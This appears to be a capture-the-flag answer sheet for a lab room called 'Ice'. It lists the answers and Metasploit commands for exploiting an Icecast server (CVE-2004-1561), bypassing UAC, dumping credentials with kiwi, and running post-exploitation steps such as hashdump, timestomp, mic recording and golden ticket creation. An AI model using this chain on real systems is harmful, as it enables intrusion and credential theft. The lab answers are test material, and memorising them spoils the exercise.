# Ice

## Summary

## Solutions

1. Connect

   1. Connect to network and Complete
   2. Complete
   3. Complete
   4. Complete

2. Recon

   1. Deploy and Complete
   2. `sudo nmap -sV -vv -sC -sS -A -p- --script vuln <BOX_IP>`
   3. `3389` (ms-wbt-server)
   4. `Icecast`
   5. `DARK-PC`

3. Gain Access

   1. Finding the exploit
      1. exploit-db search for icecast
      2. find exploit with metasploit
      3. search in [http://www.cvedetails.com]
      4. `execute code overflow`
   2. `CVE-2004-1561`
   3. `msfdb init` -> `msfconsole`
   4. `search icecast` -> `exploit/windows/http/icecast_header`
   5. `use 0`
   6. `show options` -> `RHOSTS`
   7. `exploit`

4. Escalate

   1. `meterpreter`
   2. `getuid` -> `Dark`
   3. `sysinfo` -> `7601`
   4. `x64`
   5. `run post/multi/recon/local_exploit_suggester`
   6. `exploit/windows/local/bypassuac_eventvwr`
   7. `background`
   8. `use exploit/windows/local/bypassuac_eventvwr`
   9. `set SESSION 1`
   10. `LHOST`
   11. `ip_addr` -> `set LHOST <output_eth_ip>`
   12. `run -j`
   13. `session 2`
   14. `getprivs` -> `SeTakeOwnershipPrivilege`

5. Looting

   1. `ps`
   2. `spoolsv.exe`
   3. `migrate -N spoolsv.exe`
   4. `NT AUTHORITY\SYSTEM`
   5. `load kiwi`
   6. `help`
   7. `creds_all`
   8. `Password01!`

6. Post-Exploitation

   1. `help`
   2. `hashdump`
   3. `screenshare`
   4. `record_mic`
   5. `timestomp`
   6. `golden_ticket_create`
   7. `run post/windows/manage/enable_rdp`

7. Extra Credit

   1. Complete
